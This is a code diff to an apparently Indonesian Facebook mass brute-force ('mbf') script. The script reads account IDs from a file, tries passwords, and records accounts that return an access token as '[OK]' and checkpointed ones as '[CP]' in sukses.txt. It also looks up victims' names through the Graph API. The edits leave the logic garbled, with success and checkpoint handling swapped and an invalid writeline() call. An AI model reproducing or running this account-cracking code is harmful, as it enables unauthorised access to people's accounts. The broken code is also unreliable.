@@ -201,11 +201,11 @@ def mbf():
         except KeyboardInterrupt:
             print
             print d+ " Keluar Dari Program"
-             sys.exit()
+            sys.exit()
             
 def iqbaldevmbf():
     
-    global count, dadi, gagal, oradadi, baris,
+    global count, dadi, gagal, oradadi, baris
     
     try:
         data_lis = open('id.txt', "r")
@@ -219,13 +219,14 @@ def iqbaldevmbf():
                 break
                 
             elif "access_token" in jsl:
-                dadi = open("sukses.txt", "w").writeline().
-                dadi.close()
+                gagal.append(h+" [OK] " + d + user + " | " + m + password)
                 count += 1
                 
            
             elif "www.facebook.com" in jsl["error_msg"]:
-                gagal.append(m+" [CP] " + d + user + " | " + m + nama)
+                
+                dadi = open("sukses.txt", "w").writeline()
+                dadi.close()
                 count += 1
                 
             else:
@@ -250,7 +251,7 @@ def sel():
         dev = requests.get("https://graph.facebook.com/" + buka + "?access_token=" + token)
         jsl = json.loads(dev.text)
         nama = jsl["name"]
-        print h+" [OK] " + pu + ibal + " | " + a + nama
+        print h+" [CP] " + pu + ibal + " | " + a + nama
     for ival in gagal:
         print ival
     print
